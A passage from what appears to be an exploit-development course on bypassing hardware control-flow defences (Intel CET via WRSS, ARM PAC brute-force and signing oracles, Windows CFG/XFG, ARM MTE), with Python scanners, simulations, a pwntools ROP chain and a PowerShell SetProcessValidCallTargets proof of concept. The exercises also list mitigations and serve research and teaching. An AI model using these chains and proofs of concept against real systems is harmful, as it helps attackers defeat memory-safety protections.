    print(f"{'=' * 60}")

    if not results:
        print("  No WRSS instructions found.")
        print("  This binary does NOT enable WRSS — shadow stack is safe")
        print("  against WRSS-based bypass for this library.")
        return

    print(f"  WRSS instructions found: {len(results)}")
    print(f"\n  [CRITICAL] Each WRSS gadget is a shadow stack write primitive!")
    print(f"  Attack path:")
    print(f"    1. Gain code execution (forward-edge hijack to ENDBR gadget)")
    print(f"    2. Redirect to WRSS gadget with controlled operands")
    print(f"    3. Write attacker's desired return address to shadow stack")
    print(f"    4. Also write same address to regular stack return slot")
    print(f"    5. CET check passes (both stacks agree) → ROP chain proceeds")

    for r in results:
        print(f"\n  0x{r['addr']:016x} [{r['section']}]")
        print(f"    {r['asm']}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        # Default: scan common libraries
        targets = [
            "/usr/lib/x86_64-linux-gnu/libc.so.6",
            "/usr/lib/x86_64-linux-gnu/libpthread.so.0",
            "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
        ]
    else:
        targets = sys.argv[1:]

    for target in targets:
        if Path(target).exists():
            results = scan_for_wrss(target)
            analyze_wrss_exploitability(results, Path(target).name)
        else:
            print(f"  [!] {target} not found, skipping")

    print(f"\n{'=' * 60}")
    print(" MITIGATION: Keep WRSS disabled (default on Linux 6.6+).")
    print(" Verify: arch_prctl(ARCH_SHSTK_STATUS) should NOT include ARCH_SHSTK_WRSS")
    print(" Lock: arch_prctl(ARCH_SHSTK_LOCK, ARCH_SHSTK_SHSTK) prevents re-enabling")
    print(f"{'=' * 60}")
```

**Step 2: Conceptual WRSS exploit flow (pseudocode).**

```python
#!/usr/bin/env python3
"""wrss_exploit_concept.py — Conceptual WRSS-based CET bypass (pwntools).
This demonstrates the attack logic. Actual exploitation requires:
1. A process with WRSS enabled (JIT apps)
2. A forward-edge hijack to reach the WRSS gadget
3. Control of the WRSS operands (source value and target address)
"""

from pwn import *

context.arch = 'amd64'

def wrss_bypass_concept():
    """
    Attack flow for WRSS-based shadow stack bypass:
    
    Preconditions:
    - Target has WRSS enabled (e.g., JIT-heavy application)
    - Attacker has forward-edge control (corrupted function pointer)
    - Attacker knows or can leak SSP (via RDSSP gadget)
    
    Steps:
    1. Use RDSSP gadget to leak current shadow stack pointer
    2. Calculate target slot on shadow stack (for the ret we want to hijack)
    3. Use WRSS gadget to write our desired return address to that slot
    4. Write the same return address to the regular stack's return slot
    5. When ret executes: regular stack addr == shadow stack addr → CET passes
    """
    
    log.info("WRSS Bypass Conceptual Flow")
    log.info("=" * 50)
    
    # Simulated addresses
    rdssp_gadget = 0x7ffff7e12345   # endbr64; rdssp rax; ret
    wrss_gadget  = 0x7ffff7e23456   # endbr64; wrssq [rdi], rsi; ret
    pop_rdi_ret  = 0x7ffff7e34567   # endbr64; pop rdi; ret
    pop_rsi_ret  = 0x7ffff7e45678   # endbr64; pop rsi; ret
    target_func  = 0x7ffff7e56789   # system() or mprotect()
    
    leaked_ssp   = 0x7ffff8000100   # From RDSSP leak
    
    log.info(f"1. Leaked SSP via RDSSP gadget: {hex(leaked_ssp)}")
    log.info(f"2. Target shadow stack slot: {hex(leaked_ssp)} (current ret position)")
    
    # The WRSS chain: write our target address to the shadow stack
    chain = flat(
        pop_rdi_ret,
        leaked_ssp,          # rdi = shadow stack slot address
        pop_rsi_ret,
        target_func,         # rsi = value to write (our hijack target)
        wrss_gadget,         # wrssq [rdi], rsi → writes target_func to SS
        target_func,         # regular stack return address (must match SS)
    )
    
    log.info(f"3. WRSS chain writes {hex(target_func)} to shadow stack at {hex(leaked_ssp)}")
    log.info(f"4. Regular stack also has {hex(target_func)} at return position")
    log.info(f"5. CET check: SS[{hex(leaked_ssp)}] == stack_ret → PASS")
    log.info(f"6. Execution redirected to {hex(target_func)}")
    
    log.info("")
    log.info("DEFENSE: Disable WRSS via arch_prctl(ARCH_SHSTK_DISABLE, ARCH_SHSTK_WRSS)")
    log.info("         Lock config: arch_prctl(ARCH_SHSTK_LOCK, ARCH_SHSTK_SHSTK)")
    
    return chain

if __name__ == "__main__":
    wrss_bypass_concept()
```

---

### Exercise 4: ARM PAC Brute-Force in Forking Server Model

**Objective:** Demonstrate PAC brute-force against forking servers where each child inherits the same PAC keys.

```python
#!/usr/bin/env python3
"""pac_bruteforce_sim.py — Simulate PAC brute-force attack against forking server.

On AArch64 without FEAT_FPAC, failed PAC authentication corrupts upper bits
rather than faulting immediately. In a forking server, each child inherits
the same keys → brute-force requires at most 2^PAC_BITS attempts.

This script simulates the attack logic and calculates success probability.
"""

import random
import math
import time
from dataclasses import dataclass

@dataclass
class PACConfig:
    bits: int           # PAC width (7 for 48-bit VA + TBI, up to 16)
    feat_fpac: bool     # FEAT_FPAC: immediate fault on mismatch
    fork_rerandomize: bool  # Re-randomize keys on fork

def simulate_pac_bruteforce(config: PACConfig, attempts_limit: int = 100000):
    """Simulate PAC brute-force in forking server model."""
    pac_range = 1 << config.bits
    true_pac = random.randint(0, pac_range - 1)  # The correct PAC value
    
    print(f"\n{'=' * 60}")
    print(f" PAC Brute-Force Simulation")
    print(f" PAC bits: {config.bits}  Range: {pac_range}  FEAT_FPAC: {config.feat_fpac}")
    print(f" Fork re-randomize: {config.fork_rerandomize}")
    print(f"{'=' * 60}")
    
    if config.fork_rerandomize:
        print("\n [!] Keys re-randomized per fork — brute-force infeasible")
        print("     Each child has different keys. No state accumulation.")
        return None
    
    attempts = 0
    start_time = time.time()
    
    for candidate in range(pac_range):
        attempts += 1
        
        if candidate == true_pac:
            elapsed = time.time() - start_time
            print(f"\n [+] PAC cracked after {attempts} attempts")
            print(f"     Correct PAC: 0x{true_pac:0{config.bits // 4 + 1}x}")
            print(f"     Simulation time: {elapsed:.4f}s")
            print(f"     Expected avg: {pac_range // 2} attempts")
            
            # Real-world timing estimate
            fork_time_ms = 1.0  # ~1ms per fork() on modern systems
            real_time_s = attempts * fork_time_ms / 1000
            print(f"\n     Real-world estimate:")
            print(f"       Fork overhead: ~{fork_time_ms}ms/attempt")
            print(f"       Expected time: ~{pac_range // 2 * fork_time_ms / 1000:.1f}s")
            print(f"       Worst case: ~{pac_range * fork_time_ms / 1000:.1f}s")
            return attempts
        
        if attempts >= attempts_limit:
            break
    
    return None


def analyze_pac_configurations():
    """Analyze different PAC configurations and attack feasibility."""
    configs = [
        PACConfig(bits=7,  feat_fpac=False, fork_rerandomize=False),
        PACConfig(bits=11, feat_fpac=False, fork_rerandomize=False),
        PACConfig(bits=16, feat_fpac=False, fork_rerandomize=False),
        PACConfig(bits=7,  feat_fpac=True,  fork_rerandomize=False),
        PACConfig(bits=7,  feat_fpac=False, fork_rerandomize=True),
    ]
    
    print("\n" + "=" * 70)
    print(" PAC BRUTE-FORCE FEASIBILITY ANALYSIS")
    print("=" * 70)
    print(f"\n {'Config':<30} {'Attempts':<12} {'Time Est':<12} {'Feasible?'}")
    print(f" {'-'*30} {'-'*12} {'-'*12} {'-'*10}")
    
    for cfg in configs:
        pac_range = 1 << cfg.bits
        avg_attempts = pac_range // 2
        fork_ms = 1.0
        time_s = avg_attempts * fork_ms / 1000
        
        if cfg.fork_rerandomize:
            feasible = "NO (keys change)"
        elif cfg.feat_fpac:
            # FEAT_FPAC: every failure generates a fault
            # Still brute-forceable in forking server, but generates detectible events
            feasible = "YES (detectable)"
        elif time_s > 3600:
            feasible = "Marginal"
        else:
            feasible = "YES"
        
        name = f"{cfg.bits}-bit"
        if cfg.feat_fpac: name += " +FPAC"
        if cfg.fork_rerandomize: name += " +rerand"
        
        print(f" {name:<30} {avg_attempts:<12} {time_s:<12.1f}s {feasible}")
    
    print(f"\n MITIGATIONS:")
    print(f"   1. FEAT_FPAC (M3+, X4+): faults on failure → detectable")
    print(f"   2. Re-randomize keys on fork (fork+execve model)")
    print(f"   3. Rate-limit fork() or child process creation")
    print(f"   4. Monitor for abnormal child crash patterns (BROP-style)")
    
    # Run one simulation
    simulate_pac_bruteforce(PACConfig(bits=7, feat_fpac=False, fork_rerandomize=False))


def pacman_speculative_analysis():
    """Analyze PACMAN speculative oracle attack."""
    print(f"\n{'=' * 60}")
    print(f" PACMAN SPECULATIVE ORACLE ANALYSIS")
    print(f"{'=' * 60}")
    print(f"""
 PACMAN (MIT 2022, Apple M1):
 - Uses speculative execution as PAC oracle
 - NO crashes, NO faults — completely silent
 - Attacker measures cache side-channel after speculative AUTIA
 
 Attack steps:
 1. Place candidate pointer (with guessed PAC) in register
 2. Train branch predictor to speculatively execute AUTIA path
 3. Dependent load indexes probe array based on authenticated pointer
 4. Correct PAC → speculative load warms cache line
 5. Wrong PAC → corrupted address, no cache line warm
 6. Flush+Reload on probe array reveals correct/incorrect guess
 
 Key properties:
 - Works in SINGLE-process model (no forking needed)
 - PAC cracked in microseconds per attempt (speculative, no syscall)
 - 2^16 attempts × ~1μs ≈ 65ms for 16-bit PAC
 - Completely undetectable by standard monitoring
 
 Mitigations:
 - FEAT_FPAC: faults speculatively (implementation-dependent)
 - M2+ microarch: blocks speculative loads through unauthenticated ptrs
 - Speculative execution restriction on PAC instructions (pipeline stall)
 
 Impact assessment:
 - Requires local code execution + corruption primitive
 - Reduces PAC to a ~65ms delay, not a hard barrier
 - Does NOT enable remote exploitation alone
""")


if __name__ == "__main__":
    analyze_pac_configurations()
    pacman_speculative_analysis()
```

---

### Exercise 5: PAC Signing Oracle Construction

**Objective:** Identify and exploit signing gadgets — code paths that sign attacker-controlled values with PAC keys.

```python
#!/usr/bin/env python3
"""pac_signing_oracle_finder.py — Find potential PAC signing oracles in AArch64 binaries.

A signing oracle is a code path where:
1. The attacker controls the value being signed (e.g., via argument)
2. The signed result is stored/returned in an accessible location
3. The modifier used matches the modifier at the authentication site

This tool scans AArch64 binaries for PACIA/PACDA instructions reachable
from externally-callable functions.
"""

import subprocess
import re
import sys
from collections import defaultdict
from pathlib import Path


def disassemble_aarch64(binary_path):
    """Disassemble AArch64 binary and extract PAC instructions."""
    try:
        result = subprocess.run(
            ['aarch64-linux-gnu-objdump', '-d', binary_path],
            capture_output=True, text=True, timeout=60
        )
        return result.stdout
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return ""


def find_pac_instructions(disasm):
    """Extract all PAC-related instructions and their context."""
    pac_ops = defaultdict(list)
    current_function = ""
    
    func_pattern = re.compile(r'^[0-9a-f]+ <(.+)>:')
    insn_pattern = re.compile(
        r'^\s*([0-9a-f]+):\s+[0-9a-f]+\s+(paci[ab](?:sp|z)?|'
        r'auti[ab](?:sp|z)?|pacda|pacdb|pacga|ret[ab]{2}|br[ab]{2}|blr[ab]{2})\s*(.*)'
    )
    
    for line in disasm.split('\n'):
        func_match = func_pattern.match(line)
        if func_match:
            current_function = func_match.group(1)
            continue
        
        insn_match = insn_pattern.match(line)
        if insn_match:
            addr = int(insn_match.group(1), 16)
            mnemonic = insn_match.group(2)
            operands = insn_match.group(3).strip()
            pac_ops[current_function].append({
                'addr': addr,
                'mnemonic': mnemonic,
                'operands': operands,
            })
    
    return pac_ops


def classify_signing_oracle_potential(func_name, pac_insns):
    """Assess whether a function could serve as a signing oracle."""
    signs = [i for i in pac_insns if i['mnemonic'].startswith('paci') 
             and i['mnemonic'] != 'paciasp' and i['mnemonic'] != 'pacibsp']
    
    if not signs:
        return None
    
    # Functions that sign non-SP values are potential oracles
    oracle_risk = "LOW"
    notes = []
    
    for s in signs:
        if 'sp' not in s['operands'].lower():
            oracle_risk = "HIGH"
            notes.append(f"Signs with non-SP modifier: {s['mnemonic']} {s['operands']}")
        
        if s['mnemonic'] in ('pacia', 'pacib', 'pacda', 'pacdb'):
            oracle_risk = "MEDIUM" if oracle_risk == "LOW" else oracle_risk
            notes.append(f"General-form PAC at 0x{s['addr']:x}: {s['mnemonic']} {s['operands']}")
    
    # Higher risk if function is externally callable (not static)
    if not func_name.startswith('.') and not func_name.startswith('_'):
        if oracle_risk == "MEDIUM":
            oracle_risk = "HIGH"
        notes.append("Function appears externally callable")
    
    return {
        'function': func_name,
        'risk': oracle_risk,
        'sign_instructions': signs,
        'notes': notes,
    }


def report_oracle_candidates(pac_ops):
    """Generate report of potential signing oracle functions."""
    print(f"\n{'=' * 70}")
    print(f" PAC SIGNING ORACLE ANALYSIS")
    print(f"{'=' * 70}")
    
    candidates = []
    for func_name, insns in pac_ops.items():
        result = classify_signing_oracle_potential(func_name, insns)
        if result and result['risk'] in ('MEDIUM', 'HIGH'):
            candidates.append(result)
    
    # Sort by risk
    candidates.sort(key=lambda x: {'HIGH': 0, 'MEDIUM': 1}.get(x['risk'], 2))
    
    if not candidates:
        print("  No potential signing oracles found.")
        print("  Binary appears to use only PACIASP (return address signing).")
        return
    
    print(f"\n  Found {len(candidates)} potential signing oracle candidates:")
    
    for c in candidates[:20]:
        risk_color = {'HIGH': '***', 'MEDIUM': '**', 'LOW': '*'}[c['risk']]
        print(f"\n  {risk_color} [{c['risk']}] {c['function']}")
        for note in c['notes']:
            print(f"       {note}")
        for s in c['sign_instructions']:
            print(f"       @ 0x{s['addr']:x}: {s['mnemonic']} {s['operands']}")
    
    print(f"\n{'─' * 70}")
    print(f" EXPLOITATION:")
    print(f"   For a HIGH-risk oracle, the attacker needs:")
    print(f"   1. Control of the value register (x0 for PACIA x0, x1)")
    print(f"   2. Control of the modifier register (x1) — OR match the")
    print(f"      modifier that will be used at the authentication site")
    print(f"   3. Ability to observe the signed result (return value, memory)")
    print(f"   4. A use site where the signed pointer passes AUTIA check")
    print(f"")
    print(f" DEFENSE:")
    print(f"   - Use unique, non-attacker-controllable modifiers (address-based)")
    print(f"   - Audit all PACIA/PACDA sites for user-controllable operands")
    print(f"   - PACStack: chain PAC with call-site context (invalidates cross-context reuse)")
    print(f"{'=' * 70}")


def pac_discriminator_audit_script():
    """Generate the PAC discriminator audit as a standalone bash script."""
    script = '''#!/usr/bin/env bash
# pac_discriminator_audit.sh — Extract PAC instruction usage from AArch64 ELF.
set -euo pipefail
BINARY="${1:?Usage: $0 <aarch64-elf>}"

echo "=== PAC Instruction Audit: $(basename "$BINARY") ==="
echo ""

echo "--- Instruction Frequency ---"
aarch64-linux-gnu-objdump -d "$BINARY" 2>/dev/null | \\
    grep -oE '\\b(paci[ab](sp|z)?|auti[ab](sp|z)?|ret[ab]{2}|br[ab]{2}|blr[ab]{2}|pacga)\\b' | \\
    sort | uniq -c | sort -rn

echo ""
echo "--- PACIASP Sites (return address signing, SP modifier) ---"
PACIASP_COUNT=$(aarch64-linux-gnu-objdump -d "$BINARY" 2>/dev/null | grep -c 'paciasp' || echo "0")
echo "  Count: $PACIASP_COUNT"

echo ""
echo "--- PACIA with non-SP modifiers (potential signing oracles) ---"
aarch64-linux-gnu-objdump -d "$BINARY" 2>/dev/null | \\
    grep 'pacia\\b' | grep -v 'paciasp' | head -20

echo ""
echo "--- Functions WITHOUT PAC (missing paciasp in prologue) ---"
aarch64-linux-gnu-objdump -d "$BINARY" 2>/dev/null | \\
    grep -B1 'stp.*x29, x30' | grep -v 'paciasp' | \\
    grep '>:' | head -20

echo ""
TOTAL_FUNCS=$(aarch64-linux-gnu-objdump -d "$BINARY" 2>/dev/null | grep -c '>:$' || echo "0")
echo "--- Summary ---"
echo "  Total functions: $TOTAL_FUNCS"
echo "  PAC-protected (paciasp): $PACIASP_COUNT"
if [ "$TOTAL_FUNCS" -gt 0 ]; then
    COVERAGE=$((PACIASP_COUNT * 100 / TOTAL_FUNCS))
    echo "  Coverage: ${COVERAGE}%"
fi
'''
    print("\n[Generating pac_discriminator_audit.sh]")
    with open('/tmp/pac_discriminator_audit.sh', 'w') as f:
        f.write(script)
    print("  Written to /tmp/pac_discriminator_audit.sh")
    print("  Usage: bash /tmp/pac_discriminator_audit.sh <aarch64-binary>")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        binary = sys.argv[1]
        if Path(binary).exists():
            disasm = disassemble_aarch64(binary)
            if disasm:
                pac_ops = find_pac_instructions(disasm)
                report_oracle_candidates(pac_ops)
            else:
                print(f"[!] Could not disassemble {binary}")
                print("    Ensure aarch64-linux-gnu-objdump is installed")
        else:
            print(f"[!] File not found: {binary}")
    else:
        print("Usage: python3 pac_signing_oracle_finder.py <aarch64-elf-binary>")
        print("\nGenerating audit script for manual analysis...")
    
    pac_discriminator_audit_script()
```

---

### Exercise 6: Microsoft CFG Bitmap Analysis and XFG Type-Hash Collision Finding

**Objective:** Analyze CFG bitmap structure, demonstrate `SetProcessValidCallTargets` abuse, and find XFG type-hash collisions.

```python
#!/usr/bin/env python3
"""cfg_xfg_analysis.py — CFG bitmap analysis and XFG collision finder.
Analyzes PE binaries for CFG/XFG configuration and finds type-hash collisions
that enable forward-edge CFI bypass on Windows.

Requires: pefile >= 2023.2.7
Usage:    python3 cfg_xfg_analysis.py ntdll.dll kernel32.dll
"""

import sys
import struct
from collections import defaultdict
from pathlib import Path

try:
    import pefile
except ImportError:
    print("[!] pefile not installed. Run: pip install pefile")
    sys.exit(1)

# IMAGE_GUARD_* flags from winnt.h
GUARD_FLAGS = {
    "CF_INSTRUMENTED":           0x00000100,
    "CFW_INSTRUMENTED":          0x00000200,
    "CF_FUNCTION_TABLE_PRESENT": 0x00000400,
    "SECURITY_COOKIE_UNUSED":    0x00000800,
    "PROTECT_DELAYLOAD_IAT":     0x00001000,
    "DELAYLOAD_IAT_IN_OWN_SECTION": 0x00002000,
    "CF_EXPORT_SUPPRESSION_INFO": 0x00004000,
    "CF_ENABLE_EXPORT_SUPPRESSION": 0x00008000,
    "CF_LONGJUMP_TABLE":         0x00010000,
    "RF_INSTRUMENTED":           0x00020000,
    "RF_ENABLE":                 0x00040000,
    "RF_STRICT":                 0x00080000,
    "RETPOLINE_PRESENT":         0x00100000,
    "EH_CONTINUATION_TABLE":     0x00200000,
    "XFG_ENABLED":               0x00800000,
}


def analyze_cfg_status(pe_path):
    """Analyze CFG/XFG configuration of a PE binary."""
    try:
        pe = pefile.PE(pe_path, fast_load=False)
        pe.parse_data_directories()
    except Exception as e:
        print(f"  [!] Cannot parse {pe_path}: {e}")
        return None

    result = {
        'path': pe_path,
        'name': Path(pe_path).name,
        'cfg_enabled': False,
        'xfg_enabled': False,
        'cet_compatible': False,
        'guard_flags': 0,
        'cfg_targets': 0,
    }

    # DLL characteristics
    dc = pe.OPTIONAL_HEADER.DllCharacteristics
    result['aslr'] = bool(dc & 0x0040)
    result['dep'] = bool(dc & 0x0100)
    result['guard_cf'] = bool(dc & 0x4000)

    if not hasattr(pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
        return result

    lc = pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
    gf = getattr(lc, 'GuardFlags', 0)
    result['guard_flags'] = gf
    result['cfg_enabled'] = bool(gf & GUARD_FLAGS['CF_INSTRUMENTED'])
    result['xfg_enabled'] = bool(gf & GUARD_FLAGS.get('XFG_ENABLED', 0x00800000))
    result['cfg_targets'] = getattr(lc, 'GuardCFFunctionCount', 0)

    # CET compatibility
    ext = getattr(lc, 'DllCharacteristicsEx', 0)
    result['cet_compatible'] = bool(ext & 0x1)

    return result


def extract_xfg_hashes(pe_path):
    """Extract XFG type hashes from PE CFG function table."""
    try:
        pe = pefile.PE(pe_path, fast_load=False)
        pe.parse_data_directories()
    except Exception:
        return {}

    if not hasattr(pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
        return {}

    lc = pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
    if not hasattr(lc, 'GuardCFFunctionTable'):
        return {}

    table_rva = lc.GuardCFFunctionTable - pe.OPTIONAL_HEADER.ImageBase
    count = lc.GuardCFFunctionCount
    # Stride includes extra data per entry (flags, XFG hash)
    stride = max((lc.GuardFlags >> 28) & 0xF, 4) if hasattr(lc, 'GuardFlags') else 4

    hashes = defaultdict(list)
    for i in range(min(count, 50000)):  # Cap for safety
        try:
            entry_offset = table_rva + i * stride
            rva = struct.unpack_from("<I", pe.get_data(entry_offset, 4))[0]
            # XFG hash is stored at [function_rva - 8] in the binary
            xfg_data = pe.get_data(rva - 8, 8)
            xfg_hash = struct.unpack("<Q", xfg_data)[0]
            if xfg_hash != 0:
                hashes[xfg_hash].append(rva)
        except Exception:
            continue

    return hashes


def find_xfg_collisions(hashes, binary_name):
    """Find XFG type-hash collisions (same prototype = same hash)."""
    collisions = {h: rvas for h, rvas in hashes.items() if len(rvas) > 1}

    print(f"\n  XFG Analysis: {binary_name}")
    print(f"    Unique type hashes: {len(hashes)}")
    print(f"    Collision sets (>1 func with same hash): {len(collisions)}")

    if not collisions:
        print(f"    No XFG collisions found (or XFG not enabled)")
        return collisions

    # Sort by collision size (largest first)
    sorted_collisions = sorted(collisions.items(), key=lambda x: -len(x[1]))

    print(f"\n    Top collision sets (interchangeable targets at call sites):")
    for xfg_hash, rvas in sorted_collisions[:10]:
        print(f"      Hash 0x{xfg_hash:016x} → {len(rvas)} functions:")
        for rva in rvas[:5]:
            print(f"        RVA 0x{rva:08x}")
        if len(rvas) > 5:
            print(f"        ... and {len(rvas) - 5} more")

    total_interchangeable = sum(len(r) for r in collisions.values())
    print(f"\n    Total interchangeable function pairs: {total_interchangeable}")
    print(f"    Attack surface: at any XFG-checked call site, attacker can")
    print(f"    redirect to any function in the same collision set.")

    return collisions


def cfg_bitmap_analysis():
    """Explain CFG bitmap structure and attack vectors."""
    print(f"\n{'=' * 70}")
    print(f" CFG BITMAP INTERNALS & ATTACK VECTORS")
    print(f"{'=' * 70}")
    print(f"""
 CFG Bitmap Structure:
 - Process-wide bitmap covering 0x0 to 0x7FFFFFFFFFFF (user space)
 - Each bit = one 8-byte-aligned address
 - Bit N → address N × 8
 - Bitmap size: ~1 GiB (sparse/demand-paged)
 - Location: PEB → load config → GuardCFDispatchFunctionPointer region

 Validation (ntdll!LdrpValidateUserCallTarget):
   1. bit_index = target_address >> 3
   2. byte_offset = bit_index >> 3
   3. bit_position = bit_index & 7
   4. if (bitmap[byte_offset] >> bit_position) & 1 == 0: FAST_FAIL

 Attack Vector 1: SetProcessValidCallTargets abuse
   - API allows marking arbitrary addresses as valid targets
   - Requires: initial code execution to call the API
   - Mitigation: ACG blocks API; CET+ACG blocks completely

 Attack Vector 2: CFG bitmap direct corruption
   - Write primitive targeting bitmap memory
   - Requires: know bitmap base (info leak from PEB)
   - Mitigation: bitmap mapped read-only (Win10 1709+)
   
 Attack Vector 3: XFG type-hash collision
   - Find function with matching prototype but different behavior
   - Requires: large binary with many functions of same signature
   - Mitigation: fine-grained hashing (future), monomorphic devirtualization
""")


def setprocessvalidcalltargets_poc():
    """Generate PowerShell POC for SetProcessValidCallTargets abuse."""
    poc = '''# cfg_whitelist_poc.ps1 — SetProcessValidCallTargets abuse demonstration.
# WARNING: This is for authorized security testing only.
# Requires: Windows 10+ with CFG, admin/debug privileges.

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public struct CFG_CALL_TARGET_INFO {
    public UIntPtr Offset;
    public UIntPtr Flags;
}

public class CfgBypass {
    public const uint CFG_CALL_TARGET_VALID = 0x00000001;
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetProcessValidCallTargets(
        IntPtr hProcess,
        IntPtr VirtualAddress,
        UIntPtr RegionSize,
        uint NumberOfOffsets,
        [In, Out] CFG_CALL_TARGET_INFO[] OffsetInformation
    );
    
    public static bool WhitelistAddress(IntPtr baseAddr, ulong offset) {
        var info = new CFG_CALL_TARGET_INFO[] {
            new CFG_CALL_TARGET_INFO {
                Offset = new UIntPtr(offset),
                Flags = new UIntPtr(CFG_CALL_TARGET_VALID)
            }
        };
        
        bool result = SetProcessValidCallTargets(
            new IntPtr(-1),  // Current process
            baseAddr,
            new UIntPtr(0x1000),  // Region size (page)
            1,
            info
        );
        
        if (!result) {
            int err = Marshal.GetLastWin32Error();
            Console.WriteLine($"[-] SetProcessValidCallTargets failed: error {err}");
            Console.WriteLine("    Possible causes:");
            Console.WriteLine("    - ACG (Arbitrary Code Guard) is blocking the call");
            Console.WriteLine("    - Process mitigation policy prevents CFG modification");
        }
        return result;
    }
}
"@

# Example: whitelist an address in ntdll
# $ntdll = [System.Diagnostics.Process]::GetCurrentProcess().Modules | 
#           Where-Object { $_.ModuleName -eq "ntdll.dll" }
# $base = $ntdll.BaseAddress
# [CfgBypass]::WhitelistAddress($base, 0x12345)

Write-Host "CFG Whitelist POC loaded. Use [CfgBypass]::WhitelistAddress(base, offset)"
Write-Host "DEFENSE: Enable ACG, CET strict mode, BlockNonCetBinaries"
'''
    print("\n  [Generated: cfg_whitelist_poc.ps1]")
    return poc


def main():
    print(f"{'=' * 70}")
    print(f" CFG/XFG ANALYSIS TOOL")
    print(f"{'=' * 70}")

    cfg_bitmap_analysis()

    if len(sys.argv) > 1:
        for pe_path in sys.argv[1:]:
            if not Path(pe_path).exists():
                print(f"  [!] File not found: {pe_path}")
                continue

            status = analyze_cfg_status(pe_path)
            if status:
                print(f"\n  Binary: {status['name']}")
                print(f"    ASLR: {'Y' if status['aslr'] else 'N'}  "
                      f"DEP: {'Y' if status['dep'] else 'N'}  "
                      f"Guard CF: {'Y' if status['guard_cf'] else 'N'}")
                print(f"    CFG instrumented: {'Y' if status['cfg_enabled'] else 'N'}")
                print(f"    XFG enabled: {'Y' if status['xfg_enabled'] else 'N'}")
                print(f"    CET compatible: {'Y' if status['cet_compatible'] else 'N'}")
                print(f"    CFG targets: {status['cfg_targets']}")

                # XFG collision analysis
                hashes = extract_xfg_hashes(pe_path)
                if hashes:
                    find_xfg_collisions(hashes, status['name'])
    else:
        print("\n  Usage: python3 cfg_xfg_analysis.py <pe-binary> [<pe-binary> ...]")
        print("  Example: python3 cfg_xfg_analysis.py ntdll.dll kernel32.dll")

    setprocessvalidcalltargets_poc()


if __name__ == "__main__":
    main()
```

---

### Exercise 7: ARM MTE Bypass Techniques

**Objective:** Demonstrate MTE bypass vectors: tag reuse probability, async MTE exploitation window, and sub-granule data-only attacks.

```python
#!/usr/bin/env python3
"""mte_bypass_analysis.py — ARM MTE bypass technique analysis and simulation.

Simulates MTE tag collision probability, async exploitation window,
and sub-granule overflow scenarios.
"""

import random
import math
from dataclasses import dataclass
from typing import List

TAG_BITS = 4
TAG_RANGE = 1 << TAG_BITS  # 16 possible tags (0x0–0xF)
GRANULE_SIZE = 16  # MTE operates at 16-byte granularity


@dataclass
class Allocation:
    address: int
    size: int
    tag: int
    freed: bool = False


class MTEAllocatorSimulator:
    """Simulate Scudo-style MTE-aware allocator behavior."""
    
    def __init__(self, exclude_adjacent=True, exclude_previous=True):
        self.allocations: List[Allocation] = []
        self.exclude_adjacent = exclude_adjacent
        self.exclude_previous = exclude_previous
        self.next_addr = 0x1000
    
    def malloc(self, size: int) -> Allocation:
        # Align to granule
        aligned_size = ((size + GRANULE_SIZE - 1) // GRANULE_SIZE) * GRANULE_SIZE
        
        # Generate tag, excluding adjacent allocation's tag
        excluded_tags = set()
        if self.exclude_adjacent and self.allocations:
            # Scudo excludes the immediately adjacent allocation's tag
            excluded_tags.add(self.allocations[-1].tag)
        if self.exclude_previous:
            # Also exclude the previous allocation at this address (if reused)
            for alloc in reversed(self.allocations):
                if alloc.address == self.next_addr and alloc.freed:
                    excluded_tags.add(alloc.tag)
                    break
        
        available = [t for t in range(TAG_RANGE) if t not in excluded_tags]
        tag = random.choice(available)
        
        alloc = Allocation(
            address=self.next_addr,
            size=aligned_size,
            tag=tag
        )
        self.allocations.append(alloc)
        self.next_addr += aligned_size + GRANULE_SIZE  # Guard granule
        return alloc
    
    def free(self, alloc: Allocation):
        alloc.freed = True
        # Re-tag with different random tag (Scudo behavior)
        excluded = {alloc.tag}
        available = [t for t in range(TAG_RANGE) if t not in excluded]
        alloc.tag = random.choice(available)  # New tag for freed memory


def simulate_tag_reuse_uaf(trials=10000):
    """Simulate use-after-free tag collision probability."""
    print(f"\n{'=' * 60}")
    print(f" MTE UAF TAG REUSE SIMULATION ({trials} trials)")
    print(f"{'=' * 60}")
    
    collisions_at = []  # Track which attempt succeeds
    
    for _ in range(trials):
        alloc = MTEAllocatorSimulator()
        
        # Allocate and free
        obj = alloc.malloc(64)
        original_tag = obj.tag
        alloc.free(obj)
        
        # Try to reallocate at same address with same tag
        for attempt in range(100):
            new_obj = alloc.malloc(64)
            if new_obj.tag == original_tag:
                collisions_at.append(attempt + 1)
                break
            alloc.free(new_obj)
    
    if collisions_at:
        avg = sum(collisions_at) / len(collisions_at)
        median = sorted(collisions_at)[len(collisions_at) // 2]
        success_rate = len(collisions_at) / trials * 100
        
        print(f"\n  Results:")
        print(f"    Success rate: {success_rate:.1f}% (got collision within 100 attempts)")
        print(f"    Average attempts to collision: {avg:.1f}")
        print(f"    Median attempts: {median}")
        print(f"    Theoretical: 1/{TAG_RANGE - 1} = {100/(TAG_RANGE-1):.1f}% per attempt")
        print(f"                 Expected avg: {(TAG_RANGE-1)/2:.1f} attempts")
    
    print(f"\n  Attack implications:")
    print(f"    - UAF with {TAG_RANGE-1} retries has ~{100*(1-(14/15)**15):.0f}% cumulative success")
    print(f"    - Forking/restarting server: each attempt = new process")
    print(f"    - Sync MTE: each wrong guess = SIGSEGV (detectable)")
    print(f"    - Async MTE: wrong guess may not crash immediately")


def simulate_async_mte_window():
    """Analyze the async MTE exploitation window."""
    print(f"\n{'=' * 60}")
    print(f" ASYNC MTE EXPLOITATION WINDOW ANALYSIS")
    print(f"{'=' * 60}")
    print(f"""
  Synchronous MTE: tag mismatch → immediate Data Abort (ESR DFSC=0x11)
  Asynchronous MTE: tag mismatch → sets TFSRE0_EL1, defers fault
  
  EXPLOITATION WINDOW (async mode):
  
  T1: Overflow write with wrong tag
      └── TFSRE0_EL1 flag set (no fault yet!)
      
  T2: Corrupted data used by application
      └── If corrupted data is a function pointer → CONTROL HIJACK
